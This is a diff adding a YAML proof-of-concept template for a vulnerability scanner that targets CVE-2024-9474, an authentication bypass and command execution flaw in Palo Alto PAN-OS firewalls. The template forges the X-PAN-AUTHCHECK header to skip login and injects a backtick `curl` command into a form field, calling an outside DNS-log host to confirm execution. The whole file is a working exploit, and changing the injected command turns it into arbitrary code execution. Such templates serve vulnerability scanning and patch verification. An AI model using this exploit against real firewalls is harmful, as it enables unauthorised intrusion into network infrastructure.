@@ -1,0 +1,49 @@
+id: poc-yaml-pan-os-management-web-rce
+info:
+  name: Palo Alto Networks PAN-OS身份认证绕过及命令执行漏洞(CVE-2024-9474)
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  - CVE-2024-9474
+  finger: pan-os
+  quake: app:"Palo Alto 网络防火墙"
+variables:
+  rand_str: to_lower(random_str(5))
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /php/utils/CmsGetDeviceSoftwareVersion.php/.js.map
+  output:
+  - regex_match(headers,`PHPSESSID=(?P<PHPSESSID>.*?);`)
+  headers:
+    X-PAN-AUTHCHECK: false
+  expression: 'status_code == 200 &&
+
+    contains(body,"0.0.0")
+
+    '
+- method: POST
+  path: /php/utils/createRemoteAppwebSession.php/{{.rand_str}}.js.map
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID={{.PHPSESSID}}
+    X-PAN-AUTHCHECK: false
+  data: user=`curl+{{.reverseDomain}}`&userRole=superuser&remoteHost=&vsys=vsys1
+  expression: 'status_code == 200 &&
+
+    contains(body,"@start")
+
+    '
+- method: GET
+  path: /index.php/.js.map
+  headers:
+    Cookie: PHPSESSID={{.PHPSESSID}}
+    X-PAN-AUTHCHECK: false
+  expression: 'status_code == 200 &&
+
+    reverse.Verify()
+
+    '
+transport: http
